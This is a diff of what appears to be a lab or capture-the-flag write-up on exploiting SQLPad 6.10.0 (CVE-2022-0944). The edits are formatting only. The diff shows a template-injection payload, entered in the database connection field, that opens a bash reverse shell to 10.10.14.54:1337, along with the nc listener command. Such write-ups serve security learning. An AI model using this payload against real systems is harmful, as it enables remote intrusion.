@@ -148,14 +148,16 @@ A quick Google search for "SQLPad 6.10.0 exploit" led me to [CVE-2022-0944](http
 
 I found a Proof of Concept (PoC) from [huntr](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) Here's how I used it
 
-- Click on `Connections`->`Add` connection
+- Click on `Connections` -> `Add` connection
 - Choose MySQL as the driver
 - Input the following payload into the Database form field
 - Modified the Payload
 
-```php
+{% raw %}
+```bash
 "{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.54/1337 0>&1\"') }}"
 ```
+{% endraw %}
 
 I set up a listener using `nc -lvnp 1337` and hit the "Test" button on the SQLPad connection page
 
